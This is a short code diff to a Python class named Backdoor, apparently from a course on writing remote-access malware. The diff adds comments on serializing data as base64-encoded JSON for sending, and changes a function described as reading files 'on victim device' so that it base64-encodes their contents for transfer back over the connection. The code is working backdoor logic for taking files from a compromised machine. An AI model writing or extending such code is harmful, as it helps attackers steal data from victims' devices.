@@ -13,6 +13,9 @@ class Backdoor:
     
     def reliable_send(self, data):
         # Safety way to send data as json
+        '''
+        data is list so we have to data -> json (serialization) and next json -> base64 beacuse it is safer way to send data and in last episode base64->json bcs in this way we can use try to wait until whole data program recive in reliable_receive
+        '''
         json_data = json.dumps(base64.b64encode(json.dumps(data).encode()).decode())
         self.connection.send(json_data.encode())
 
@@ -39,7 +42,7 @@ class Backdoor:
     def read_file(self, file_path):
         # Function which read files on victim device
         with open(file_path, 'rb') as file:
-            return file.read().decode()
+            return base64.b64encode(file.read()).decode()
 
     def run(self):
         # Method which run everythong - receiving, sending, executing, etc.
